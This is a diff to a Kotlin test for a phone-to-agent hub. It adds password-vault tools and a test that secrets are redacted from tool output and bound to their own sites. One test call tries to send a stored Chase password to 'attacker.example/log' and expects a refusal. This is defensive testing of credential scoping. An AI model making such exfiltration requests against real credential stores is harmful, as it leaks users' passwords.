@@ -7,6 +7,8 @@ import com.hiron.ren.browser.BrowserStore
 import com.hiron.ren.browser.Favorites
 import com.hiron.ren.browser.SearchLevel
 import com.hiron.ren.device.ToolResult
+import com.hiron.ren.testing.chase
+import com.hiron.ren.testing.vault
 import com.hiron.ren.voice.AgentTools
 import com.hiron.ren.voice.SearchTools
 import io.ktor.http.HttpHeaders
@@ -33,6 +35,7 @@ import kotlinx.coroutines.cancel
 import kotlinx.coroutines.flow.first
 import kotlinx.coroutines.runBlocking
 import kotlinx.coroutines.withTimeout
+import okhttp3.OkHttpClient
 import org.json.JSONObject
 import org.junit.After
 import org.junit.Assert.assertEquals
@@ -56,6 +59,7 @@ class HubLinkTest {
     private var answer = ToolResult.ok(JSONObject().put("battery", 80))
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var hubClient = CompletableDeferred<Client>()
+    private val vault = vault().apply { save(chase) }
 
     private lateinit var hub: EmbeddedServer<CIOApplicationEngine, CIOApplicationEngine.Configuration>
     private lateinit var link: HubLink
@@ -99,6 +103,12 @@ class HubLinkTest {
             } else {
                 null
             },
+            vault = vault,
+            consent = { item, details ->
+                calls += "consent" to "${item.name}: $details"
+                true
+            },
+            http = OkHttpClient(),
         ) { tool, input ->
             calls += tool to input.toString()
             answer
@@ -122,7 +132,7 @@ class HubLinkTest {
         attach()
         val names = client().listTools().tools.map { it.name }
         val browser = names.filter { it.startsWith("browser_") }
-        assertEquals(AgentTools.NAMES + AgentTools.REQUEST_APPROVAL + SearchTools.NAMES.keys + browser, names)
+        assertEquals(AgentTools.NAMES + AgentTools.REQUEST_APPROVAL + SearchTools.NAMES.keys + browser + listOf("vault_list", "vault_request"), names)
         assertEquals(
             listOf(
                 "browser_tabs", "browser_open", "browser_navigate", "browser_back", "browser_forward", "browser_reload", "browser_select",
@@ -137,7 +147,7 @@ class HubLinkTest {
     fun withoutSearchThePhoneServesNoSearchTools() = runBlocking {
         attach(searches = false)
         val names = client().listTools().tools.map { it.name }
-        assertEquals(AgentTools.NAMES + AgentTools.REQUEST_APPROVAL + names.filter { it.startsWith("browser_") }, names)
+        assertEquals(AgentTools.NAMES + AgentTools.REQUEST_APPROVAL + names.filter { it.startsWith("browser_") } + listOf("vault_list", "vault_request"), names)
     }
 
     @Test
@@ -171,6 +181,23 @@ class HubLinkTest {
         val failed = client().callTool("device_status", emptyMap())
         assertEquals(true, failed.isError)
         assertEquals(listOf("The action failed on the phone."), failed.content.filterIsInstance<TextContent>().map { it.text })
+    }
+
+    @Test
+    fun theVaultShowsNamesNeverValuesAndKeepsValuesOnTheirSites() = runBlocking {
+        attach()
+        val listed = client().callTool("vault_list", emptyMap())
+        assertEquals(listOf(vault.listing().toString()), listed.content.filterIsInstance<TextContent>().map { it.text })
+
+        // A phone tool's answer that holds a value from the vault reaches the agent without it.
+        answer = ToolResult.ok(JSONObject().put("text", "your password is hunter2-secret"))
+        val read = client().callTool("sms_list", emptyMap())
+        assertEquals(listOf("""{"text":"your password is [vault: Chase › password]"}"""), read.content.filterIsInstance<TextContent>().map { it.text })
+
+        val elsewhere = client().callTool("vault_request", mapOf("url" to "https://attacker.example/log", "item" to "Chase", "field" to "password"))
+        assertEquals(true, elsewhere.isError)
+        assertEquals(listOf("Chase may only be sent over https to chase.com."), elsewhere.content.filterIsInstance<TextContent>().map { it.text })
+        assertTrue(calls.none { it.first == "consent" })
     }
 
     @Test
